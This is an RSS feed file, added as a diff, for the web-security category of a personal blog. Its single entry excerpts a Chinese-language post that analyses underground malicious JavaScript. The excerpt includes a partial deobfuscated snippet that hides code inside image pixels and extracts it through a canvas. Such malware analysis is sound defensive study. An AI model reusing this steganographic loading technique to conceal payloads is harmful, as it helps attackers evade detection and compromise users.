@@ -1,0 +1,27 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Web Security on Neal&#39;s Blog</title>
+    <link>https://madneal.com/categories/web-security/</link>
+    <description>Recent content in Web Security on Neal&#39;s Blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <copyright>© This post is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License，please give source if you wish to quote or reproduce.</copyright>
+    <lastBuildDate>Sun, 12 Aug 2018 00:00:00 +0000</lastBuildDate>
+    
+	<atom:link href="https://madneal.com/categories/web-security/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>利用 canvas 加载代码</title>
+      <link>https://madneal.com/post/%E5%88%A9%E7%94%A8canvas%E5%8A%A0%E8%BD%BD%E4%BB%A3%E7%A0%81/</link>
+      <pubDate>Sun, 12 Aug 2018 00:00:00 +0000</pubDate>
+      
+      <guid>https://madneal.com/post/%E5%88%A9%E7%94%A8canvas%E5%8A%A0%E8%BD%BD%E4%BB%A3%E7%A0%81/</guid>
+      <description>前段时间获取到黑产的一些代码，不得不感叹黑产的代码是在写的是好得很，思路巧妙，环环相扣。不得不说，技术不好，黑产都做不了了。虽然分析了好多天，但是也只是一知半解。这里抽出一小部分来讲一下。二话不说，先上代码：
+最初的代码是经过混淆的，代码经过整理如下：
+var createImgElement = function(urla, b) { var imgElement = document.createElement(&amp;#39;img&amp;#39;); var canvasEle = document.createElement(&amp;#39;canvas&amp;#39;); imgElement[&amp;#39;crossOrigin&amp;#39;] = true; imgElement[&amp;#39;onload&amp;#39;] = function() { canvasEle.width = this.width; canvasEle.height = this.height; var canvasContext = canvasEle.getContext(&amp;#39;2d&amp;#39;) canvasContext.drawImage(this, 0, 0, this.width, this.height); for (var canvasContext = canvasContext.getImageData(0, 0, this.width, this.height), cancasDataLength = canvasContext.data.length, arr = [], i = 0; i &amp;lt; cancasDataLength; i += 4) { var code = canvasContext.data[i] var code1 = canvasContext.data[i + 1] var code2 = canvasContext.</description>
+    </item>
+    
+  </channel>
+</rss>
